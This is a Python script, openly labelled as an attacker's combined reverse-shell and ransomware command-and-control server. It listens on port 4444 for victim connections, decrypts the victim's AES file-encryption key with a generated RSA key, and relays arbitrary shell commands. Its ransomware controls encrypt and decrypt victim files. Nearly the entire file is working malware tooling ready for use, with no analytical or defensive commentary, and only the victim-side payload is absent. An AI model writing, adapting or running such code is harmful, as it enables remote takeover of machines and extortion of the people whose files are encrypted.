#!/usr/bin/env python3
"""
COMBINED ATTACKER: REVERSE SHELL + RANSOMWARE COMMAND CENTER
Run on: 198.168.100.4
"""
import socket
import threading
import sys
import time
import os
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Util import Counter
from Crypto.Random import get_random_bytes

class CombinedAttacker:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = None
        self.client_socket = None
        self.client_address = None
        self.running = False
        self.victim_keys = {}
        self.current_victim_id = None
        self.decipher = None

    def start(self):
        """Start the combined attacker listener"""
        print("\n" + "=" * 60)
        print("COMBINED ATTACKER: REVERSE SHELL + RANSOMWARE CONTROL")
        print("=" * 60)
        print(f"[*] IP Address: 198.168.100.4")
        print(f"[*] Listening Port: {self.port}")
        print(f"[*] Waiting for victim connection...")
        print("[*] Press Ctrl+C to stop\n")

        
        try:
            # Create TCP socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(f"[+] Listening on {self.host}:{self.port}")
            print("[+] Make sure Windows Firewall is disabled!")
            print("[+] Waiting for victim to connect...\n")

            # Accept connection
            self.client_socket, self.client_address = self.server_socket.accept()
            victim_ip = self.client_address[0]
            self.current_victim_id = f"{victim_ip}:{self.client_address[1]}"

            print(f"[+] VICTIM CONNECTED: {self.current_victim_id}")

            # RSA Key Setup for ransomware
            if not os.path.exists("private.pem"):
                print("[!] Generating RSA keys for ransomware...")
                self.generate_rsa_keys()

            # Load private key
            try:
                with open("private.pem", "rb") as f:
                    private_key = RSA.import_key(f.read(), passphrase=b'my strong passphrase')
                self.decipher = PKCS1_OAEP.new(private_key)
                print("[+] RSA private key loaded for ransomware operations")
            except Exception as e:
                print(f"[-] Error loading private key: {e}")
                print("[*] Generating new keys...")
                self.generate_rsa_keys()
                with open("private.pem", "rb") as f:
                    private_key = RSA.import_key(f.read(), passphrase=b'my strong passphrase')
                self.decipher = PKCS1_OAEP.new(private_key)

            # Send welcome message
            welcome_msg = f"""
[+] ==============================================
[+] COMBINED ATTACK CONNECTION ESTABLISHED
[+] ==============================================
[+] Attacker: 198.168.100.4
[+] Victim: {victim_ip}
[+] Time: {time.ctime()}
[+] Reverse Shell: Active
[+] Ransomware Control: Ready
[+] Type 'help' for commands
[+] ==============================================\n
"""
            self.client_socket.send(welcome_msg.encode())

            # Wait for victim to send encrypted AES key
            print("[+] Waiting for victim's encrypted AES key...")
            encrypted_aes_key = self.receive_data(256)  # RSA 2048 produces 256-byte output

            if encrypted_aes_key:
                # Decrypt victim's AES key
                try:
                    victim_aes_key = self.decipher.decrypt(encrypted_aes_key)
                    self.victim_keys[self.current_victim_id] = victim_aes_key
                    print(f"[+] Decrypted victim's AES key: {victim_aes_key.hex()}")

                    # Send confirmation
                    self.client_socket.send("Key received. System ready for ransomware commands.".encode())
                except Exception as e:
                    print(f"[-] Error decrypting AES key: {e}")
                    self.client_socket.send("Error: Could not decrypt AES key".encode())
            else:
                print("[-] No AES key received from victim")
                self.client_socket.send("Error: No AES key received".encode())

            # Start interactive shell
            self.interactive_shell()

        except KeyboardInterrupt:
            print("\n[*] Stopped by user")
        except Exception as e:
            print(f"\n[-] ERROR: {str(e)}")
        finally:
            self.cleanup()

    def generate_rsa_keys(self):
        """Generate RSA keys for ransomware"""
        try:
            key = RSA.generate(2048)

            # Save private key with passphrase
            private_key = key.export_key(passphrase=b'my strong passphrase', pkcs=8, protection="scryptAndAES128-CBC")
            with open("private.pem", "wb") as f:
                f.write(private_key)

            # Save public key
            public_key = key.publickey().export_key()
            with open("public.pem", "wb") as f:
                f.write(public_key)

            print("[+] RSA keys generated: private.pem and public.pem")
        except Exception as e:
            print(f"[-] Error generating RSA keys: {e}")

    def receive_data(self, size):
        """Receive exact amount of data"""
        data = b""
        while len(data) < size:
            try:
                chunk = self.client_socket.recv(size - len(data))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                break
            except Exception as e:
                print(f"[-] Receive error: {e}")
                break
        return data

    def interactive_shell(self):
        """Interactive command shell with ransomware capabilities"""
        print("[+] Starting combined interactive shell...")

        while self.running:
            try:
                # Get command from attacker
                command = input(f"\nattacker@{self.current_victim_id}> ").strip()

                if not command:
                    continue

                # Check for exit command
                if command.lower() == "exit":
                    print("[*] Closing connection...")
                    self.client_socket.send(b"exit")
                    break

                # Special commands
                if command.lower() == "help":
                    self.show_help()
                    continue

                if command.lower() == "clear":
                    print("\n" * 50)
                    continue

                # Send command to victim
                self.client_socket.send(command.encode())

                # Ransomware commands
                if command.lower() in ["en", "encrypt"]:
                    print("[+] Sending encryption command to victim...")
                    self.wait_for_response()
                    continue

                if command.lower() in ["de", "decrypt"]:
                    print("[+] Sending decryption command to victim...")
                    time.sleep(0.5)

                    # Send decryption key
                    if self.current_victim_id in self.victim_keys:
                        key = self.victim_keys[self.current_victim_id]
                        self.client_socket.send(key)
                        print(f"[+] Sent decryption key: {key.hex()}")
                    else:
                        print("[!] No key found for this victim")
                        self.client_socket.send(b"NO_KEY")
                    self.wait_for_response()
                    continue

                if command.lower() == "scan":
                    print("[+] Sending scan command to victim...")
                    self.wait_for_response()
                    continue

                if command.lower() == "status":
                    print("[+] Sending status command to victim...")
                    self.wait_for_response()
                    continue

                # Receive response from victim for regular commands
                print("\n" + "=" * 50)
                print("[VICTIM OUTPUT]")
                print("=" * 50)

                # Receive all data
                total_data = b""
                self.client_socket.settimeout(3)

                try:
                    while True:
                        chunk = self.client_socket.recv(4096)
                        if not chunk:
                            break
                        total_data += chunk
                        # Check for end marker
                        if b"END_OF_OUTPUT" in chunk:
                            total_data = total_data.replace(b"END_OF_OUTPUT", b"")
                            break
                except socket.timeout:
                    pass
                finally:
                    self.client_socket.settimeout(None)
 
                # Display response
                if total_data:
                    try:
                        print(total_data.decode('utf-8', errors='ignore'))
                    except:
                        print("[!] Could not decode response")
                else:
                    print("[+] Command executed (no output)")

                print("=" * 50)

            except KeyboardInterrupt:
                print("\n[*] Sending exit command...")
                self.client_socket.send(b"exit")
                break
            except Exception as e:
                print(f"[-] Error: {e}")
                break

    def wait_for_response(self):
        """Wait for victim response"""
        self.client_socket.settimeout(10)
        try:
            response = self.client_socket.recv(4096)
            if response:
                print(f"[VICTIM] {response.decode('utf-8', errors='ignore')}")
        except socket.timeout:
            print("[!] No response from victim (timeout)")
        finally:
            self.client_socket.settimeout(None)

    def show_help(self):
        """Show help menu with all capabilities"""
        help_text = """
[+] ==============================================
[+] COMBINED ATTACK COMMANDS
[+] ==============================================
[+] Basic Commands:
    help          - Show this help
    exit          - Exit shell
    clear         - Clear screen

[+] System Information:
    whoami        - Current user
    systeminfo    - System information
    ipconfig      - Network configuration
    netstat -an   - Network connections
    tasklist      - Running processes
    ps            - Running processes (Linux)

[+] File Operations:
    dir           - List directory
    cd [path]     - Change directory
    type [file]   - View file (Windows)
    cat [file]    - View file (Linux)
    ls            - List directory (Linux)

[+] Ransomware Commands:
    encrypt       - Encrypt victim files
    decrypt       - Decrypt files (requires key)
    scan          - Scan for target files
    status        - Check encryption status

[+] Remote Control:
    shutdown /s   - Shutdown victim (Windows)
    reboot        - Restart victim (Linux)
    screenshot    - Take screenshot

[+] Network:
    ifconfig      - Network info (Linux)
    arp -a        - ARP table
    net user      - List users (Windows)

[+] ==============================================
"""
        print(help_text)

    def cleanup(self):
        """Cleanup resources"""
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass
        print("\n[*] Connection closed")
        print("[*] Combined attacker stopped")


def main():
    """Main function"""
    try:
        ATTACKER_PORT = 4444
        attacker = CombinedAttacker(port=ATTACKER_PORT)
        attacker.start()
    except Exception as e:
        print(f"[-] Fatal error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    # Check if required module is installed
    try:
        from Crypto.PublicKey import RSA

        print("[+] PyCryptodome module is installed")
    except ImportError:
        print("[-] ERROR: PyCryptodome module not installed!")
        print("[*] Install it using: pip install pycryptodome")
        sys.exit(1)

    # Run main
    main()














